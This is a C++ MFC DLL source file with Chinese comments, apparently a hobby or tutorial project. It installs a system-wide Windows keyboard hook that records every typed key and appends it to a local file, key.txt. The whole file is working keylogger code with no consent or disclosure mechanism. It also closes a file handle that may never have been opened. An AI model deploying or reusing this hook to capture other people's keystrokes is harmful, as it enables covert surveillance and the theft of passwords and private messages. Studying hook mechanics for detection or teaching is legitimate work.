// KeyboardHook.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include <afxdllx.h>
#include <stdio.h>



#include "KeyboardHook.h"//自定义的头文件


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/*********************my****************************/
//自定义全局共享数据变量
#pragma data_seg("mydata")
	HHOOK glhHook = NULL;  //安装的鼠标钩子句柄
	HINSTANCE glhInstance = NULL;  //DLL实例句柄
#pragma data_seg()
/**************************************************/


static AFX_EXTENSION_MODULE KeyboardHookDLL = { NULL, NULL };

extern "C" int APIENTRY
DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	// Remove this if you use lpReserved
	UNREFERENCED_PARAMETER(lpReserved);

	/*********************my****************************/
	//my 插入保存DLL实例的句柄
	glhInstance = hInstance;//插入保存DLL实例句柄
	/*************************************************/
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		TRACE0("KEYBOARDHOOK.DLL Initializing!\n");
		
		// Extension DLL one-time initialization
		if (!AfxInitExtensionModule(KeyboardHookDLL, hInstance))
			return 0;

		// Insert this DLL into the resource chain
		// NOTE: If this Extension DLL is being implicitly linked to by
		//  an MFC Regular DLL (such as an ActiveX Control)
		//  instead of an MFC application, then you will want to
		//  remove this line from DllMain and put it in a separate
		//  function exported from this Extension DLL.  The Regular DLL
		//  that uses this Extension DLL should then explicitly call that
		//  function to initialize this Extension DLL.  Otherwise,
		//  the CDynLinkLibrary object will not be attached to the
		//  Regular DLL's resource chain, and serious problems will
		//  result.

		new CDynLinkLibrary(KeyboardHookDLL);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
		TRACE0("KEYBOARDHOOK.DLL Terminating!\n");
		// Terminate the library before destructors are called
		AfxTermExtensionModule(KeyboardHookDLL);
	}
	return 1;   // ok

	

}
/*********************my****************************/
//键盘钩子函数
	LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
	{
		char ch = 0;
		FILE *fl;
		if( ((DWORD)lParam&0x40000000) && (HC_ACTION==nCode) )//有键按下
		{
			if( (wParam==VK_SPACE) || (wParam==VK_RETURN) || (wParam>=0x2f)	&& (wParam<=0x100) )
			{
				fl=fopen("key.txt","a+");//输出到key.txt中
				if(wParam==VK_SPACE)
					ch=' ';
				else if(wParam==VK_RETURN)
					ch='\n';
				else
				{
					BYTE ks[256];
					GetKeyboardState(ks);
					WORD w;
					UINT scan=0;
					ToAscii(wParam,scan,ks,&w,0);
					
					//ch=MapVirtualKey(wParam,2);//将虚键代码转换成字符
					ch=char(w);
					//ch=char(w);
				}//else

				printf("%c",ch);
				//cout<<ch;
				fwrite(&ch,sizeof(char),1,fl);

			}//if
			fclose(fl);
		}//if
		return CallNextHookEx(glhHook,nCode,wParam,lParam);
	}//proc

	CKeyboardHook::CKeyboardHook()
	{
	}

	CKeyboardHook::~CKeyboardHook()
	{
		if(glhHook)
			UnhookWindowsHookEx(glhHook);
	}

	//安装钩子并设定接受显示窗口句柄
	BOOL CKeyboardHook::StartHook()
	{
		BOOL bResult=FALSE;
		glhHook=SetWindowsHookEx(WH_KEYBOARD,KeyboardProc,glhInstance,NULL);
		
		if(glhHook!=NULL)
		{
			bResult=TRUE;
			//cout<<glhHook;
		}

		return bResult;
	}

	//卸载
	BOOL CKeyboardHook::StopHook()
	{
		BOOL bResult=FALSE;
		if(glhHook)
		{
			bResult=UnhookWindowsHookEx(glhHook);
			if(bResult)
				glhHook=NULL;
		}
		return bResult;
	}
	//KeyboardHook.def中SECTION部分为定义共享数据段属性
/*************************************************/